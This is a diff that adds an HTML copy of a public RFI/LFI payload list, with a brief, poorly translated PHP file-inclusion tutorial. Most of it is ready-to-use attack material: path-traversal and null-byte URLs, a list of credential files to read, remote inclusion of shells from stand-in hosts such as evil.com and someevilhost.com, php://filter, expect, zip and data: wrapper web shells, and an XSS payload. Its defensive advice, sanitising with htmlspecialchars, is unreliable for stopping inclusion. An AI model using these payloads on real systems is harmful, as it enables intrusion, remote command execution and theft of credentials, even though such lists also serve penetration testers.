@@ -1,0 +1,116 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h3 id="rfi-lfi-payload-list">RFI/LFI Payload List</h3>
+<p align="center">
+<img src="https://github.com/payloadbox/rfi-lfi-payload-list/blob/master/img/rfi-lfi.jpeg">
+</p>
+
+<p align="center">
+  <img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg"> <img src="https://img.shields.io/github/stars/payloadbox/rfi-lfi-payload-list?style=social"> <img src="https://img.shields.io/github/forks/payloadbox/rfi-lfi-payload-list?style=social"> <img src="https://img.shields.io/github/repo-size/payloadbox/payloadbox/rfi-lfi-payload-list"> <img src="https://img.shields.io/github/license/payloadbox/rfi-lfi-payload-list"> <img src="https://img.shields.io/github/issues/detail/author//payloadbox/rfi-lfi-payload-list/1">
+</p>
+
+<p>As with many exploits, remote and local file inclusions are only a problem at the end of the encoding. Of course, it takes a second person to have it. Now, this article will hopefully give you an idea of protecting your website and most importantly your code from a file iclusion exploit. I’ll give example codes in PHP format.</p>
+<p>Let’s look at some of the code that makes RFI / LFI exploits possible.</p>
+<pre><code><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">index.php?page</span>=<span class="hljs-string">file1.php</span>&gt;</span> Files <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+<span class="php"><span class="hljs-meta">&lt;?</span> Php
+$ page = $ _GET [page];
+<span class="hljs-keyword">include</span> ($ page);
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre><p>Obviously this should not be used. The $ page entry is not fully cleared. $ page input is directed directly to the damn web page, which is a big “NO”. Always remove any input passing through the browser. When the user clicks on “File” to visit “files.php” when he visits the web page, something will appear like this.</p>
+<pre><code><span class="hljs-symbol">http:</span> <span class="hljs-comment">//localhost/index.php? page = files.php</span>
+</code></pre><p>Now, if no one has cleared the input in the $ page variable, we can have it pointed to what we want. If hosted on a unix / linux server, we can display the password as configuration files for shaded or uncleaned variable input.</p>
+<p>Viewing files on the server is a “Local File Inclusion” or LFI exploit. This is no worse than an RFI exploit.</p>
+<pre><code>http: <span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php? page = .. /</span> .. <span class="hljs-regexp">/ .. /</span> .. <span class="hljs-regexp">/ .. /</span> .. <span class="hljs-regexp">/ etc /</span> passwd
+</code></pre><p>The code will probably return to / etc / passwd. Now let’s look at the RFI aspect of this exploit. Let’s get some of the codes we’ve taken before.</p>
+<pre><code><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">index.php?page</span>=<span class="hljs-string">file1.php</span>&gt;</span> Files <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+<span class="php"><span class="hljs-meta">&lt;?</span> Php
+$ page = $ _GET [page];
+<span class="hljs-keyword">include</span> ($ page);
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre><p>Now suppose we write something like …</p>
+<pre><code>http: <span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php? page = http: /</span><span class="hljs-regexp">/google.com/</span>
+</code></pre><p>Probably where the $ page variable was originally placed on the page, we get the google.com homepage. This is where the codder 
+can be hurt. We all know what c99 (shell) can do, and if coders are careful, they may be included in the page, allowing users to surf through sensitive files and contacts at the appropriate time. Let’s look at something simpler that can happen on a web page. The faster and more dirty use of RFI exploitation is to your advantage. Now, create a file named “test.php” and put the following code in it and save it.</p>
+<pre><code>
+<span class="php"><span class="hljs-meta">&lt;?</span> Php
+passthru ($ _ GET [cmd]);
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre><p>Now this file is something you can use to your advantage to include it on a page with RFI exploitation. The passthru () command in PHP is very evil, and many hosts call it “out of service for security reasons”. With this code in test.php, we can send a request to the web page, including file inclusion exploit.</p>
+<pre><code>http: <span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php? page = http: /</span><span class="hljs-regexp">/someevilhost.com/</span>test.php
+</code></pre><p>When the code makes a $ _GET request, we must provide a command to pass to passthru (). We can do something like this.</p>
+<pre><code>http: <span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/index.php? page = http: /</span><span class="hljs-regexp">/someevilhost.com/</span>test.php? cmd = cat <span class="hljs-regexp">/ etc /</span> passwd
+</code></pre><p>This unix machine will also extract the file / etc / passwd using the cat command. Now we know how to exploit RFI exploit, now we need to know how to hold it and make it impossible for anyone to execute the command, and how to include remote pages on your server. First, we can disable passthru (). But anything on your site can use it again (hopefully not). But this is the only thing you can do. I suggest cleaning the inputs as I said before. Now, instead of just passing variables directly to the page, we can use a few PHP-proposed structures within functions. Initially, chop () from perl was adapted to PHP, which removes whitespaces from an array. We can use it like this.</p>
+<pre><code><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">index.php?page</span>=<span class="hljs-string">file1.php</span>&gt;</span> Files <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+<span class="php"><span class="hljs-meta">&lt;?</span> Php
+$ page = chop ($ _ GET [page]);
+<span class="hljs-keyword">include</span> ($ page);
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre><p>There are many functions that can clear string. htmlspecialchars ()
+htmlentities (), stripslashes () and more. In terms of confusion, I prefer to use my own functions. We can do a function in PHP that can clear everything for you, here I’ve prepared something easy and quick about this course for you.</p>
+<pre><code>&lt;? Php
+function cleanAll ($ input) {
+$ input = strip_tags ($ input);
+$ input = htmlspecialchars ($ input);
+<span class="hljs-keyword">return</span> ($ input);
+}
+<span class="hljs-meta">?&gt;</span>
+</code></pre><p>Now I hope you can see what’s going on inside this function, so you can add yours. I would suggest using the str_replace () function and there are a lot of other functions to clear them. Be considerate and stop the RFI &amp; LFI exploit frenzy!</p>
+<h4 id="basic-lfi-null-byte-double-encoding-and-other-tricks-">Basic LFI (null byte, double encoding and other tricks) :</h4>
+<pre><code><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/index.php?page=etc/passwd</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/index.php?page=etc/passwd%00</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/index.php?page=../../etc/passwd</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/index.php?page=%252e%252e%252f</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/index.php?page=....//....//etc/passwd</span>
+</code></pre><p>Interesting files to check out :</p>
+<pre><code><span class="hljs-meta-keyword">/etc/</span>issue
+<span class="hljs-meta-keyword">/etc/</span>passwd
+<span class="hljs-meta-keyword">/etc/</span>shadow
+<span class="hljs-meta-keyword">/etc/</span>group
+<span class="hljs-meta-keyword">/etc/</span>hosts
+<span class="hljs-meta-keyword">/etc/</span>motd
+<span class="hljs-meta-keyword">/etc/</span>mysql/my.cnf
+<span class="hljs-meta-keyword">/proc/</span>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*<span class="hljs-meta-keyword">/fd/</span>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*   (first number is the PID, second is the filedescriptor)
+<span class="hljs-meta-keyword">/proc/</span>self/environ
+<span class="hljs-meta-keyword">/proc/</span>version
+<span class="hljs-meta-keyword">/proc/</span>cmdline
+</code></pre><h4 id="basic-rfi-null-byte-double-encoding-and-other-tricks-">Basic RFI (null byte, double encoding and other tricks) :</h4>
+<pre><code>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=http://evil.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">shell</span>.txt
+http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=http://evil.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">shell</span>.txt%<span class="hljs-number">00</span>
+http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=http:%<span class="hljs-number">252</span><span class="hljs-keyword">f</span>%<span class="hljs-number">252</span>fevil.<span class="hljs-keyword">com</span>%<span class="hljs-number">252</span>fshell.txt
+</code></pre><h4 id="lfi-rfi-wrappers-">LFI / RFI Wrappers :</h4>
+<p>LFI Wrapper rot13 and base64 - php://filter case insensitive.</p>
+<pre><code>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php://<span class="hljs-built_in">filter</span>/<span class="hljs-keyword">read</span>=<span class="hljs-built_in">string</span>.rot13/resource=<span class="hljs-built_in">index</span>.php
+http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php://<span class="hljs-built_in">filter</span>/convert.base64-encode/resource=<span class="hljs-built_in">index</span>.php
+http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=pHp://FilTer/convert.base64-encode/resource=<span class="hljs-built_in">index</span>.php
+
+Can <span class="hljs-keyword">be</span> chained with <span class="hljs-keyword">a</span> compression wrapper.
+http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php://<span class="hljs-built_in">filter</span>/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+</code></pre><h4 id="lfi-wrapper-zip-">LFI Wrapper ZIP :</h4>
+<pre><code>echo "<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>" &gt; payload.php;  
+zip payload.zip payload.php;   
+mv payload.zip shell.jpg;    
+rm payload.php   
+
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+</code></pre><h4 id="rfi-wrapper-data-with-payload-">RFI Wrapper DATA with &quot;&quot; payload :</h4>
+<pre><code>http:<span class="hljs-regexp">//</span>example.net<span class="hljs-regexp">/?page=data:/</span><span class="hljs-regexp">/text/</span>plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+</code></pre><h4 id="rfi-wrapper-expect-">RFI Wrapper EXPECT :</h4>
+<pre><code>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php:expec<span class="hljs-variable">t:</span>//id
+http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php:expec<span class="hljs-variable">t:</span>//<span class="hljs-keyword">ls</span>
+</code></pre><h4 id="xss-via-rfi-lfi-with-payload-">XSS via RFI/LFI with &quot;&quot; payload :</h4>
+<pre><code>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=data:application/</span>x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+</code></pre><h4 id="lfi-to-rce-via-proc-fd-">LFI to RCE via /proc/*/fd :</h4>
+<ol>
+<li>Upload a lot of shells (for example : 100)</li>
+<li>Include <a href="http://example.com/index.php?page=/proc/$PID/fd/$FD">http://example.com/index.php?page=/proc/$PID/fd/$FD</a> with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li>
+</ol>
+<h4 id="lfi-to-rce-via-upload-">LFI to RCE via Upload :</h4>
+<pre><code>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=path/<span class="hljs-keyword">to</span>/uploaded/<span class="hljs-keyword">file</span>.png
+</code></pre><h4 id="references-">References :</h4>
+<p>👉 <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">Testing for Local File Inclusion</a></p>
+<p>👉 <a href="www.wikipedia.org/wiki/Local_File_Inclusion">Wikipedia</a></p>
+<p>👉 <a href="http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion">Remote File Inclusion</a></p>
+<p>👉 <a href="http://en.wikipedia.org/wiki/Remote_File_Inclusion">Wikipedia: &quot;Remote File Inclusion&quot;</a></p>
+<p>👉 <a href="https://www.owasp.org/index.php/PHP_File_Inclusion">PHP File Inclusion</a></p>
+</body></html>
